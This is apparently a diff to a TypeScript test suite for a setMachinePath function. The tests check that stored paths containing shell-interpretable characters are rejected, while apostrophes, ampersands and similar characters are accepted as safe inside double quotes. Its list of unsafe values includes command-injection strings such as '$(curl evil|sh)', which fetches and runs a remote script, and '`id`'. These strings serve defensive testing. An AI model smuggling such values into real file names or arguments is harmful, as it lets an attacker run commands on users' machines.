@@ -145,13 +145,21 @@ describe('getMachinePath / setMachinePath', () => {
 });
 
 describe('path values a shell would interpret (#1934)', () => {
-  const UNSAFE = ['$(curl evil|sh)', '`id`', '"', "'", '\\', ';', '|', '&', '<', '>', '\n', '\r', '\0'];
+  const UNSAFE = ['$(curl evil|sh)', '`id`', '"', '\\', '\n', '\r', '\0'];
   const cases = MACHINE_PATH_KEYS.flatMap((key) => UNSAFE.map((bad) => [key, bad] as const));
 
   it.each(cases)('setMachinePath refuses %s containing %j and stores nothing', (key, bad) => {
     expect(() => setMachinePath(key, `/tmp/list${bad}.md`)).toThrow(/a path may not contain/);
     expect(fs.existsSync(getLocalConfigPath())).toBe(false);
   });
+
+  it.each(["John's Vault/list.md", 'Notes & Docs/list.md', 'a;b|c<d>e.md'])(
+    'accepts %j: safe inside double quotes',
+    (name) => {
+      setMachinePath('issueListPath', `/Users/me/${name}`);
+      expect(readStored()).toMatchObject({ issueListPath: { path: `/Users/me/${name}` } });
+    },
+  );
 
   it('accepts ordinary paths with spaces, dots, dashes and tildes', () => {
     setMachinePath('issueListPath', '/Users/me/My Vault/oss-list_v2.md');
